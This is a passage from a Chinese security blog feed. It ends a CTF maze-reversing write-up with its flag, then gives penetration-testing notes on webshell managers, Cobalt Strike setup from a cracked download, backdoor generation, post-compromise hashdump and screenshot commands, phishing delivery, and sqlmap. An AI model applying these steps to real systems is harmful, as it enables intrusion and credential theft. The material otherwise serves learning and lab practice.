class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">.data:00406064                 db    0</span><br><span class="line">.data:00406065                 db    0</span><br><span class="line">.data:00406066                 db    0</span><br><span class="line">.data:00406067                 db    0</span><br><span class="line">.data:00406068                 db    0</span><br><span class="line">.data:00406069                 db    0</span><br><span class="line">.data:0040606A                 db    0</span><br><span class="line">.data:0040606B                 db    0</span><br><span class="line">.data:0040606C                 db    0</span><br><span class="line">.data:0040606D                 db    0</span><br><span class="line">.data:0040606E                 db    0</span><br><span class="line">.data:0040606F                 db    0</span><br><span class="line">.data:00406070                 db    0</span><br><span class="line">.data:00406071                 db    0</span><br><span class="line">.data:00406072                 db    0</span><br><span class="line">.data:00406073                 db    0</span><br><span class="line">.data:00406074                 db    0</span><br><span class="line">.data:00406075                 db    0</span><br><span class="line">.data:00406076                 db    0</span><br><span class="line">.data:00406077                 db    0</span><br><span class="line">.data:00406078                 db    0</span><br><span class="line">.data:00406079                 db    0</span><br><span class="line">.data:0040607A                 db    0</span><br><span class="line">.data:0040607B                 db    0</span><br><span class="line">.data:0040607C                 db    1</span><br><span class="line">.data:0040607D                 db    0</span><br><span class="line">.data:0040607E                 db    0</span><br><span class="line">.data:0040607F                 db    0</span><br><span class="line">.data:00406080                 db    1</span><br><span class="line">.data:00406081                 db    0</span><br><span class="line">.data:00406082                 db    0</span><br><span class="line">.data:00406083                 db    0</span><br><span class="line">.data:00406084                 db    0</span><br><span class="line">.data:00406085                 db    0</span><br><span class="line">.data:00406086                 db    0</span><br><span class="line">.data:00406087                 db    0</span><br><span class="line">.data:00406088                 db    0</span><br><span class="line">.data:00406089                 db    0</span><br><span class="line">.data:0040608A                 db    0</span><br><span class="line">.data:0040608B                 db    0</span><br><span class="line">.data:0040608C                 db    0</span><br><span class="line">.data:0040608D                 db    0</span><br><span class="line">.data:0040608E                 db    0</span><br><span class="line">.data:0040608F                 db    0</span><br><span class="line">.data:00406090                 db    0</span><br><span class="line">.data:00406091                 db    0</span><br><span class="line">.data:00406092                 db    0</span><br><span class="line">.data:00406093                 db    0</span><br><span class="line">.data:00406094                 db    0</span><br><span class="line">.data:00406095                 db    0</span><br><span class="line">.data:00406096                 db    0</span><br><span class="line">.data:00406097                 db    0</span><br><span class="line">.data:00406098                 db    0</span><br><span class="line">.data:00406099                 db    0</span><br><span class="line">.data:0040609A                 db    0</span><br><span class="line">.data:0040609B                 db    0</span><br><span class="line">.data:0040609C                 db    1</span><br><span class="line">.data:0040609D                 db    0</span><br><span class="line">.data:0040609E                 db    0</span><br><span class="line">.data:0040609F                 db    0</span><br><span class="line">.data:004060A0                 db    0</span><br><span class="line">.data:004060A1                 db    0</span><br><span class="line">.data:004060A2                 db    0</span><br><span class="line">.data:004060A3                 db    0</span><br><span class="line">.data:004060A4                 db    1</span><br><span class="line">.data:004060A5                 db    0</span><br><span class="line">.data:004060A6                 db    0</span><br><span class="line">.data:004060A7                 db    0</span><br><span class="line">.data:004060A8                 db    1</span><br><span class="line">.data:004060A9                 db    0</span><br><span class="line">.data:004060AA                 db    0</span><br><span class="line">.data:004060AB                 db    0</span><br><span class="line">.data:004060AC                 db    1</span><br><span class="line">.data:004060AD                 db    0</span><br><span class="line">.data:004060AE                 db    0</span><br><span class="line">.data:004060AF                 db    0</span><br><span class="line">.data:004060B0                 db    0</span><br><span class="line">.data:004060B1                 db    0</span><br><span class="line">.data:004060B2                 db    0</span><br><span class="line">.data:004060B3                 db    0</span><br><span class="line">.data:004060B4                 db    0</span><br><span class="line">.data:004060B5                 db    0</span><br><span class="line">.data:004060B6                 db    0</span><br><span class="line">.data:004060B7                 db    0</span><br><span class="line">.data:004060B8                 db    1</span><br><span class="line">.data:004060B9                 db    0</span><br><span class="line">.data:004060BA                 db    0</span><br><span class="line">.data:004060BB                 db    0</span><br><span class="line">.data:004060BC                 db    1</span><br><span class="line">.data:004060BD                 db    0</span><br><span class="line">.data:004060BE                 db    0</span><br><span class="line">.data:004060BF                 db    0</span><br><span class="line">.data:004060C0                 db    1</span><br><span class="line">.data:004060C1                 db    0</span><br><span class="line">.data:004060C2                 db    0</span><br><span class="line">.data:004060C3                 db    0</span><br><span class="line">.data:004060C4                 db    0</span><br><span class="line">.data:004060C5                 db    0</span><br><span class="line">.data:004060C6                 db    0</span><br><span class="line">.data:004060C7                 db    0</span><br><span class="line">.data:004060C8                 db    1</span><br><span class="line">.data:004060C9                 db    0</span><br><span class="line">.data:004060CA                 db    0</span><br><span class="line">.data:004060CB                 db    0</span><br><span class="line">.data:004060CC                 db    0</span><br><span class="line">.data:004060CD                 db    0</span><br><span class="line">.data:004060CE                 db    0</span><br><span class="line">.data:004060CF                 db    0</span><br><span class="line">.data:004060D0                 db    0</span><br><span class="line">.data:004060D1                 db    0</span><br><span class="line">.data:004060D2                 db    0</span><br><span class="line">.data:004060D3                 db    0</span><br><span class="line">.data:004060D4                 db    0</span><br><span class="line">.data:004060D5                 db    0</span><br><span class="line">.data:004060D6                 db    0</span><br><span class="line">.data:004060D7                 db    0</span><br><span class="line">.data:004060D8                 db    0</span><br><span class="line">.data:004060D9                 db    0</span><br><span class="line">.data:004060DA                 db    0</span><br><span class="line">.data:004060DB                 db    0</span><br><span class="line">.data:004060DC                 db    0</span><br><span class="line">.data:004060DD                 db    0</span><br><span class="line">.data:004060DE                 db    0</span><br><span class="line">.data:004060DF                 db    0</span><br><span class="line">.data:004060E0                 db    0</span><br><span class="line">.data:004060E1                 db    0</span><br><span class="line">.data:004060E2                 db    0</span><br><span class="line">.data:004060E3                 db    0</span><br><span class="line">.data:004060E4                 db    1</span><br><span class="line">.data:004060E5                 db    0</span><br><span class="line">.data:004060E6                 db    0</span><br><span class="line">.data:004060E7                 db    0</span><br><span class="line">.data:004060E8                 db    0</span><br><span class="line">.data:004060E9                 db    0</span><br><span class="line">.data:004060EA                 db    0</span><br><span class="line">.data:004060EB                 db    0</span><br><span class="line">.data:004060EC                 db    1</span><br><span class="line">.data:004060ED                 db    0</span><br><span class="line">.data:004060EE                 db    0</span><br><span class="line">.data:004060EF                 db    0</span><br><span class="line">.data:004060F0                 db    0</span><br><span class="line">.data:004060F1                 db    0</span><br><span class="line">.data:004060F2                 db    0</span><br><span class="line">.data:004060F3                 db    0</span><br><span class="line">.data:004060F4                 db    0</span><br><span class="line">.data:004060F5                 db    0</span><br><span class="line">.data:004060F6                 db    0</span><br><span class="line">.data:004060F7                 db    0</span><br><span class="line">.data:004060F8                 db    1</span><br><span class="line">.data:004060F9                 db    0</span><br><span class="line">.data:004060FA                 db    0</span><br><span class="line">.data:004060FB                 db    0</span><br><span class="line">.data:004060FC                 db    1</span><br><span class="line">.data:004060FD                 db    0</span><br><span class="line">.data:004060FE                 db    0</span><br><span class="line">.data:004060FF                 db    0</span><br><span class="line">.data:00406100                 db    1</span><br><span class="line">.data:00406101                 db    0</span><br><span class="line">.data:00406102                 db    0</span><br><span class="line">.data:00406103                 db    0</span><br><span class="line">.data:00406104                 db    0</span><br><span class="line">.data:00406105                 db    0</span><br><span class="line">.data:00406106                 db    0</span><br><span class="line">.data:00406107                 db    0</span><br><span class="line">.data:00406108                 db    1</span><br><span class="line">.data:00406109                 db    0</span><br><span class="line">.data:0040610A                 db    0</span><br><span class="line">.data:0040610B                 db    0</span><br><span class="line">.data:0040610C                 db    0</span><br><span class="line">.data:0040610D                 db    0</span><br><span class="line">.data:0040610E                 db    0</span><br><span class="line">.data:0040610F                 db    0</span><br><span class="line">.data:00406110                 db    0</span><br><span class="line">.data:00406111                 db    0</span><br><span class="line">.data:00406112                 db    0</span><br><span class="line">.data:00406113                 db    0</span><br><span class="line">.data:00406114                 db    1</span><br><span class="line">.data:00406115                 db    0</span><br><span class="line">.data:00406116                 db    0</span><br><span class="line">.data:00406117                 db    0</span><br><span class="line">.data:00406118                 db    0</span><br><span class="line">.data:00406119                 db    0</span><br><span class="line">.data:0040611A                 db    0</span><br><span class="line">.data:0040611B                 db    0</span><br><span class="line">.data:0040611C                 db    0</span><br><span class="line">.data:0040611D                 db    0</span><br><span class="line">.data:0040611E                 db    0</span><br><span class="line">.data:0040611F                 db    0</span><br><span class="line">.data:00406120                 db    0</span><br><span class="line">.data:00406121                 db    0</span><br><span class="line">.data:00406122                 db    0</span><br><span class="line">.data:00406123                 db    0</span><br><span class="line">.data:00406124                 db    0</span><br><span class="line">.data:00406125                 db    0</span><br><span class="line">.data:00406126                 db    0</span><br><span class="line">.data:00406127                 db    0</span><br><span class="line">.data:00406128                 db    0</span><br><span class="line">.data:00406129                 db    0</span><br><span class="line">.data:0040612A                 db    0</span><br><span class="line">.data:0040612B                 db    0</span><br><span class="line">.data:0040612C                 db    0</span><br><span class="line">.data:0040612D                 db    0</span><br><span class="line">.data:0040612E                 db    0</span><br><span class="line">.data:0040612F                 db    0</span><br><span class="line">.data:00406130                 db    1</span><br><span class="line">.data:00406131                 db    0</span><br><span class="line">.data:00406132                 db    0</span><br><span class="line">.data:00406133                 db    0</span><br><span class="line">.data:00406134                 db    1</span><br><span class="line">.data:00406135                 db    0</span><br><span class="line">.data:00406136                 db    0</span><br><span class="line">.data:00406137                 db    0</span><br><span class="line">.data:00406138                 db    1</span><br><span class="line">.data:00406139                 db    0</span><br><span class="line">.data:0040613A                 db    0</span><br><span class="line">.data:0040613B                 db    0</span><br><span class="line">.data:0040613C                 db    35</span><br></pre></td></tr></table></figure><p>把上面的数据保存成<code>migong.txt</code>，然后用下面的脚本还原出迷宫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;migong.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (i % <span class="number">4</span>):</span><br><span class="line">            res += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        res += <span class="built_in">str</span>(data[i])[<span class="number">39</span>]</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">ress = res.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="built_in">print</span>(ress)</span><br><span class="line"></span><br><span class="line">res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ress:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        res2 += <span class="string">&#x27;X&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res2 += <span class="string">&#x27;O&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res2), <span class="number">7</span>):</span><br><span class="line">    <span class="built_in">print</span>(res2[i:i+<span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>所以这道题中的迷宫就是下面的这样，至于为什么要把四个比特位似的东西合成一个比特位俺也不知道，回头等比赛结束看看带师傅的博客学习学习。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">XOOOOOX</span><br><span class="line">XOOOOOO</span><br><span class="line">XOXXXOO</span><br><span class="line">XXXOXOO</span><br><span class="line">OOOOXOX</span><br><span class="line">OOXXXOX</span><br><span class="line">OOXOOOO</span><br><span class="line">OOXXX</span><br><span class="line"></span><br><span class="line">2622668662224422666</span><br></pre></td></tr></table></figure><p>然后把exe文件拖入OD中依次输入上面的数字最后弹出flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp//image-20210529190326303.png" alt="动态调试"></p><p><code>DASCTF&#123;f033ab37c30201f73f142449d037028d&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RelatedMessage"><a href="#RelatedMessage" class="headerlink" title="RelatedMessage"></a>RelatedMessage</h3><p><strong>泻药，好像是椭圆曲线+rsa？不会没做。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="冰蝎Shell管理工具"><a href="#冰蝎Shell管理工具" class="headerlink" title="冰蝎Shell管理工具"></a>冰蝎Shell管理工具</h2><h3 id="引用内容，与冰蝎的基本使用和原理"><a href="#引用内容，与冰蝎的基本使用和原理" class="headerlink" title="引用内容，与冰蝎的基本使用和原理"></a>引用内容，与冰蝎的基本使用和原理</h3><p><a href="https://www.anquanke.com/post/id/212271">冰蝎，从入门到魔改</a></p><p><a href="https://github.com/rebeyond/Behinder">官方给出的ReadMe文档</a></p><h3 id="使用方式，与冰蝎的优势和特征"><a href="#使用方式，与冰蝎的优势和特征" class="headerlink" title="使用方式，与冰蝎的优势和特征"></a>使用方式，与冰蝎的优势和特征</h3><p>因为从前的”菜刀”的流量很容易被各种工具检测到，才有了这个第二代的Shell管理工具，冰蝎是基于流量加密的Shell管理软件。冰蝎是基于Java的，所以可以跨平台使用。</p><p><strong>主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等</strong></p><p><a href="https://github.com/rebeyond/Behinder/releases">下载GitHub上冰蝎的Release版本</a></p><p>不过需要Jre的版本为1.6-1.8似乎是，我直接运行不了，就主要使用蚁剑来进行Shell管理了。</p><h2 id="蚁剑Shell管理工具"><a href="#蚁剑Shell管理工具" class="headerlink" title="蚁剑Shell管理工具"></a>蚁剑Shell管理工具</h2><p><a href="https://xz.aliyun.com/t/4000">从静态到动态打造一款免杀的antSword(蚁剑)</a></p><p>蚁剑主要使用的是编解码流量内容来进行绕过WAF，只能说与冰蝎各有千秋吧感觉，不好说谁好谁坏。</p><h2 id="哥斯拉Shell管理工具"><a href="#哥斯拉Shell管理工具" class="headerlink" title="哥斯拉Shell管理工具"></a>哥斯拉Shell管理工具</h2><p><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v3.03-godzilla">工具的下载地址</a></p><p>这个听说和冰蝎差不多，emmm，还没用过，用过之后再回来评价。</p><h2 id="Cobalt-Strike的安装与使用总结"><a href="#Cobalt-Strike的安装与使用总结" class="headerlink" title="Cobalt Strike的安装与使用总结"></a>Cobalt Strike的安装与使用总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Cobalt Strike也是一个木马后门的管理工具，但是这个木马管理工具相对于前面所说的几个网马工具功能多了很多了，很酷嘿嘿（众所周知，界面越炫酷，对系统所造成危害也就越大 ::doge:: ）。</p><p>所使用的方法一般就是钓鱼了，直接向被攻击者的邮箱发送一个具有诱惑性的邮件(根据被攻击者的喜好)，被攻击者点击木马之后木马上线成功，攻击者即可远程监控与控制被攻击者的PC。</p><p>但是，CS最重要的还是免杀，不能还没点呢，刚下载下来就被检测出自己的后门属性了，直接被杀还有什么后渗透可言。但是这方面的免杀还是要看二进制能力了，这不是我们主要研究的目标了，我们现在这里只需要了解CS马的简单使用即可。</p><p><a href="https://troyess.com/2021/05/23/%E5%88%9D%E8%AF%86CobaltStrike/">参考徐神的文章，徐神我的超人</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.ddosi.com/cobalt-strike-4-3-fix/">CS4.3的可以下载的地址(徐神强推的一个网站)</a></p><p><a href="https://anonfiles.com/bdQ7Ldtau3/cobaltstrike4.3_www.ddosi.com_rar">国外某网盘的下载链接(内容取自上面的那个网站)</a></p><p>解压密码为:<code>www.ddosi.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux下启动该工具</span><br><span class="line">./start.sh</span><br><span class="line">sh文件里面的命令为</span><br><span class="line">java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Windows下启动该工具</span><br><span class="line">直接点击 可执行文件exe即可。</span><br></pre></td></tr></table></figure><h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><p>在自己服务器配置服务端，CS的整体架构应该像下面这样吧？</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603131230506.png" alt="image-20210603131230506"></p><p>英格力士高级不高级，嘿嘿。</p><h4 id="安装JDK1-8-0"><a href="#安装JDK1-8-0" class="headerlink" title="安装JDK1.8.0"></a>安装JDK1.8.0</h4><p>先配置部署在云服务器的总服务端吧，首先安装JDK1.8，这里只展示centos安装的jdk1.8，其他的也都挺类似的。网上教程很详细。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">用yum安装JDK</span><br><span class="line"></span><br><span class="line">1.查看yum库中都有哪些jdk版本(暂时只发现了openjdk)</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# yum search java|grep jdk</span><br><span class="line">ldapjdk-javadoc.x86_64 : Javadoc for ldapjdk</span><br><span class="line">java-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environment</span><br><span class="line">java-1.6.0-openjdk-demo.x86_64 : OpenJDK Demos</span><br><span class="line">java-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environment</span><br><span class="line">java-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentation</span><br><span class="line">java-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundle</span><br><span class="line">java-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environment</span><br><span class="line">java-1.7.0-openjdk-demo.x86_64 : OpenJDK Demos</span><br><span class="line">java-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environment</span><br><span class="line">java-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentation</span><br><span class="line">java-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundle</span><br><span class="line">java-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environment</span><br><span class="line">java-1.8.0-openjdk-demo.x86_64 : OpenJDK Demos</span><br><span class="line">java-1.8.0-openjdk-devel.x86_64 : OpenJDK Development Environment</span><br><span class="line">java-1.8.0-openjdk-headless.x86_64 : OpenJDK Runtime Environment</span><br><span class="line">java-1.8.0-openjdk-javadoc.noarch : OpenJDK API Documentation</span><br><span class="line">java-1.8.0-openjdk-src.x86_64 : OpenJDK Source Bundle</span><br><span class="line">ldapjdk.x86_64 : The Mozilla LDAP Java SDK</span><br><span class="line"></span><br><span class="line">2.选择版本,进行安装</span><br><span class="line"></span><br><span class="line">//选择1.7版本进行安装</span><br><span class="line">[root@localhost ~]# yum install java-1.8.0-openjdk</span><br><span class="line">//安装完之后，默认的安装目录是在: /usr/lib/jvm/</span><br><span class="line"></span><br><span class="line">3.查看java版本</span><br><span class="line">[root@VM-12-8-centos ~]# java -version</span><br><span class="line">openjdk version &quot;1.8.0_292&quot;</span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_292-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</span><br></pre></td></tr></table></figure><h4 id="运行teamserver总服务端"><a href="#运行teamserver总服务端" class="headerlink" title="运行teamserver总服务端"></a>运行teamserver总服务端</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行的方式如下</span><br><span class="line">chmod +x teamserver</span><br><span class="line">./teamserver vps的ip地址 连接口令</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603135728701.png" alt="image-20210603135728701"></p><p>记得一定要把所有文件都传到linux里面，我开始没传完，一直报错，md忙了半小时，最后在徐神的帮助下才解决，日了。</p><h4 id="客户端连接服务端"><a href="#客户端连接服务端" class="headerlink" title="客户端连接服务端"></a>客户端连接服务端</h4><p>直接运行那个exe文件即可，里面的内容按刚才你填的内容写，然后IP地址、端口和密码必须跟刚才服务端那里保持一致，而用户名是可以随意设置的，这就是让团队使用的，就像一堆人连一个WiFi一样。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603141524952.png" alt="image-20210603141524952"></p><p>配置好的界面就像上面的这样，但是全是英语单词沃日，能看懂，但是只能看懂一点点。</p><h3 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">这里是详细的教程总结处</a></p><p>我这里只写我用到的各种东西(或者说是比较常用的东西)。</p><p><strong>工具栏</strong></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603143946539.png" alt="image-20210603143946539"></p><p>再就是要总结一下使用的流程吧</p><h4 id="生成木马后门"><a href="#生成木马后门" class="headerlink" title="生成木马后门"></a>生成木马后门</h4><p>首先就是创建后门木马程序啦，这一步也是整体的流程的关键一环，称之为最关键的一步也不为过，这一步直接关系到我们的木马能不能上线。这一步中最关键又是其中的免杀，但是免杀还不是我现在能研究的了的。</p><p><strong>如何生成后门木马程序</strong></p><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了下面的几个Listener</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603144418716.png" alt="image-20210603144418716"></p><p>其中一般化使用的是上面的5个Beacon的payload</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603144755208.png" alt="image-20210603144755208"></p><p>使用TCP连接生成的payload更为简单，直接点击下面的save</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//QQ%E5%BD%95%E5%B1%8F20210603145725.gif" alt="QQ录屏20210603145725"></p><p>保存后门木马文件到桌面上后，可以到虚拟机里面测试木马的性能。这里开始我用的tcp(但是一开始忘开4444端口了，后来就换成http了，注意<strong>这里的4444端口是你的vps上需要开的端口，用来接收反弹shell的</strong>)，后来发现还是http好用似乎。就直接换成http了，也懒得开虚拟机了，直接在我的物理机上测试算了。</p><p>简单地测试了一下，还是可以用的</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603160232678.png" alt="dump了一下用户密码的hash值"></p><p>hash值都dump下来了，就能在本地直接使用hashcat碰撞用户的密码啦。</p><h4 id="上线后的命令"><a href="#上线后的命令" class="headerlink" title="上线后的命令"></a>上线后的命令</h4><p>下面只记录不会太多，估计只会记录<strong>常见的、炫酷的和有用的</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump   # 把受害者主机的用户名和密码的hash值脏下来</span><br><span class="line">screenshot  # 获得受害者PC的正在显示的情况的截图，估计只是模拟按键PrntScr而已</span><br></pre></td></tr></table></figure><h5 id="桌面截图"><a href="#桌面截图" class="headerlink" title="桌面截图"></a>桌面截图</h5><p><code>screenshot</code></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603161052384.png" alt="生成截图的功能"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以直接获得受害者主机的目录并且可以上传文件，这就方便了我们后续上传更强力的马、更针对受害者环境的马。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210603222144746.png" alt="可以看到这个jar文件就是我后来通过CS上传到我的虚拟机上的"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CS后门使我们可以后续持续对受害者网络进行攻击，具体再说怎么使用就要到实战中去了，毕竟实战才是提升自己实力的最快的途径。</p><h2 id="Shiro-反序列化综合利用工具"><a href="#Shiro-反序列化综合利用工具" class="headerlink" title="Shiro 反序列化综合利用工具"></a>Shiro 反序列化综合利用工具</h2><p><a href="https://github.com/j1anFen/shiro_attack">工具的下载地址</a>，该工具应该是基于Java的，所以可以跨平台使用。</p><h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><h3 id="POST类型的sql注入"><a href="#POST类型的sql注入" class="headerlink" title="POST类型的sql注入"></a>POST类型的sql注入</h3><p>利用SQLmap进行简单的post类型的注入，因为现在很多的网站都是采用post的方式进行数据传输的，所以这里尝试一下post类型的注入。</p><h4 id="利用sqlmap自动搜索表单的方式"><a href="#利用sqlmap自动搜索表单的方式" class="headerlink" title="利用sqlmap自动搜索表单的方式"></a>利用sqlmap自动搜索表单的方式</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.160.1/sqltest/post.php&quot;</span> --forms</span><br></pre></td></tr></table></figure><h2 id="Java反序列化终极测试工具"><a href="#Java反序列化终极测试工具" class="headerlink" title="Java反序列化终极测试工具"></a>Java反序列化终极测试工具</h2><p>这个主要是java的环境不好搞，因为使用到了某些包只有特定的几个jdk版本中在使用，所以这里使用的jdk版本为<code>jdk-8u151-windows-x64.exe</code>，在国内的<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">华为镜像站下载</a></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95//image-20210719120737197.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="在线信息收集"><a href="#在线信息收集" class="headerlink" title="在线信息收集"></a>在线信息收集</h2><p><a href="https://blog.csdn.net/bring_coco/article/details/114485091?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-114485091.pc_agg_rank_aggregation&utm_term=fofa%E7%9A%84%E8%AF%AD%E6%B3%95&spm=1000.2123.3001.4430">fofa语法</a></p><h2 id="使用工具信息收集"><a href="#使用工具信息收集" class="headerlink" title="使用工具信息收集"></a>使用工具信息收集</h2><h3 id="1-one-for-all"><a href="#1-one-for-all" class="headerlink" title="1. one for all"></a>1. one for all</h3><p>强大的开源子域名收集工具</p><p><a href="https://github.com/shmilylty/OneForAll">github工具地址</a></p><p>解压后使用前首先安装py包<code>pip3 install -r requirements.txt</code>，使用帮助如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 